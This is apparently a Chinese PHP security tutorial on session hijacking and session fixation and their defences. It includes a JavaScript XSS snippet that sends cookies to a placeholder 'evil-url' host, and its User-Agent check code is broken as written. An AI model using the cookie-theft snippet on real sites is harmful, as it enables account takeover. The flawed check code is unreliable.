## Session攻击手段(会话劫持/固定)及其安全防御措施

PHP开源社区  *2019. October. 31*

#### 一、概述

对于Web应用程序来说，加强安全性的第一条原则就是——不要信任来自客户端的数据，一定要进行数据验证以及过滤才能在程序中使用，进而保存到数据层。然而，由于Http的无状态性，为了维持来自同一个用户的不同请求之间的状态，客户端必须发送一个唯一的身份标识符（Session ID）来表明自己的身份。

很显然，这与前面提到的安全原则是相违背的，但是没有办法，为了维持状态，我们别无选择，这也导致了Session在web应用程序中是十分脆弱的一个环节。

由于PHP内置的Session管理机制并没有提供安全处理，所以，开发人员需要建立相应的安全机制来防范会话攻击。针对Session的攻击手段主要有会话劫持（Session hijacking）和会话固定（Session fixation）两种。

#### 二、会话劫持（Session hijacking）

会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。

##### 攻击步骤：

- 目标用户需要先登录站点；

- 登录成功后，该用户会得到站点提供的一个会话标识SessionID；

- 攻击者通过某种攻击手段捕获Session ID；

- 攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话。

![images\session hijacking](images\session hijacking.webp)

##### 攻击者获取SessionID的方式有多种：

- 暴力破解：尝试各种Session ID，直到破解为止；

- 预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来；

- 窃取：使用网络嗅探，XSS攻击等方法获得

PHP内部Session的实现机制虽然不是很安全，但是关于生成SessionID的环节还是比较安全的，这个随机的SessionID往往是极其复杂的并且难于被预测出来，所以，对于第一、第二种攻击方式基本上是不太可能成功的。

在第三种攻击方式中，针对网络嗅探攻击，是通过捕获网络通信数据得到SessionID的，这种攻击可以通过SSL避免。本文主要分析的是应用层面的攻击方式及其防御方法。

目前有三种广泛使用的在Web环境中维护会话（传递SessionID）的方法：URL参数，隐藏域和Cookie。其中每一种都各有利弊，Cookie已经被证明是三种方法中最方便最安全的。

从安全的观点，如果不是全部也是绝大多数针对基于Cookie的会话管理机制的攻击对于URL或是隐藏域机制同样适用，但是反过来却不一定，这就让Cookie成为从安全考虑的最佳选择。  

使用Cookie而产生的一个风险是用户的Cookie会被攻击者所盗窃。如果Session ID保存在Cookie中，Cookie的暴露就是一个严重的风险，因为它能导致会话劫持。

最基本的Cookie窃取方式：XSS漏洞。

一旦站点中存在可利用的XSS漏洞，攻击者可直接利用注入的JS脚本获取Cookie，进而通过异步请求把存有Session ID的Cookie上报给攻击者。

```javascript
var img = document.createElement('img');
img.src = 'http://evil-url?c=' +encodeURIComponent(document.cookie);
document.getElementsByTagName('body')[0].appendChild(img);
```

如何寻找XSS漏洞是另外一个话题了，这里不详细讨论。防御上可以设置Cookie的HttpOnly属性，一旦一个Cookie被设置为HttpOnly，JS脚本就无法再获取到，而网络传输时依然会带上，也就是说依然可以依靠这个Cookie进行Session维持，但客户端JS对其不可见。

那么即使存在XSS漏洞也无法简单的利用其进行Session劫持攻击了。但是上面说的是无法利用XSS进行简单的攻击，但是也不是没有办法的。既然无法使用document.cookie获取到，可以转而通过其他的方式。

##### 下面介绍一种XSS结合其他漏洞的攻击方式。

利用PHP开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括Cookie信息。

如果开发者没有关闭这个页面，就可以利用XSS漏洞向这个页面发起异步请求，获取到页面内容后Parse出Cookie信息，然后上传给攻击者。

phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。防御上是关闭所有phpinfo类dump request信息的页面。

##### 防御方法：

1. 更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。

2. 关闭透明化SessionID。透明化SessionID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。

3. 设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。

4. 关闭所有phpinfo类dump request信息的页面。

5. 使用User-Agent检测请求的一致性。但有专家警告不要依赖于检查User-Agent的一致性。这是因为服务器群集中的HTTP代理服务器会对User-Agent进行编辑，而本群集中的多个代理服务器在编辑该值时可能会不一致
   
   ```php
   <?php
   session_start();
   if (isset($_SESSION['HTTP_USER_AGENT'])) {
    if ($_SESSION['HTTP_USER_AGENT'] != md5($_SESSION['HTTP_USER_AGENT'])){
    exit();
    }
   }else{
    $_SESSION['HTTP_USER_AGENT'] = md5($_SESSION['HTTP_USER_AGENT']);
   }
   ```

6. 加入Token校验。同样是用于检测请求的一致性，给攻击者制造一些麻烦，使攻击者即使获取了Session ID，也无法进行破坏，能够减少对系统造成的损失。但Token需要存放在客户端，如果攻击者有办法获取到Session ID，那么也同样可以获取到Token
   
   ```php
   <?php
   session_start();
   $token = md5(uniqid(rand(), true));
   $_SESSION['token'] = $token;
   ```
   
   

**三、 会话固定（Session fixation）**

会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。

会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。

##### 攻击步骤：

- 攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态；

- 目标用户携带攻击者设定的Session ID登录站点；

- 攻击者通过Session ID获得合法会话。
  
  ![images\session fixation](images\session fixation.webp)

##### 攻击者重置SessionID的方式：

重置Session ID的方法同样也有多种，可以是跨站脚本攻击，如果是URL传递Session ID，还可以通过诱导的方式重置该参数，比如可以通过邮件的方式诱导用户去点击重置Session ID的URL，使用Cookie传递可以避免这种攻击。

使用Cookie来存放SessionID，攻击者可以在以下三种可用的方法中选择一种来重置Session ID。

1、使用客户端脚本来设置Cookie到浏览器。大多数浏览器都支持用客户端脚本来设置Cookie的，例如document.cookie=”sessionid=123”，这种方式可以采用跨站脚本攻击来达到目的。防御方式可以是设置HttpOnly属性，但有少数低版本浏览器存在漏洞，即使设置了HttpOnly，也可以重写Cookie。所以还需要加其他方式的校验，如User-Agent验证，Token校验等同样有效。

2、 使用HTML的<META>标签加Set-Cookie属性。服务器可以靠在返回的HTML文档中增加<META>标签来设置Cookie。例如<meta http-equiv=Set-Cookiecontent=”sessionid=123”>，与客户端脚本相比，对<META>标签的处理目前还不能被浏览器禁止。

3、使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部。如会话收养，闯入目标服务器所在域的任一主机，或者是攻击用户的DNS服务器。

这里还有一点需要注意，攻击者如果持有的是有效的SessionID，那么防御措施就一定得校验验证。如攻击者可以先到目标站点登录，获得有效的Session ID，然后再拿这个Session ID去重置目标用户的会话标识，那么这时候用户将会在不知情的情况下访问攻击者设定的合法会话（实际上登录的是攻击者的账号了）中，从而攻击者将有可能获取到目标用户的敏感信息。

##### 防御方法：

1. 用户登录时生成新的SessionID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。

2. 大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。
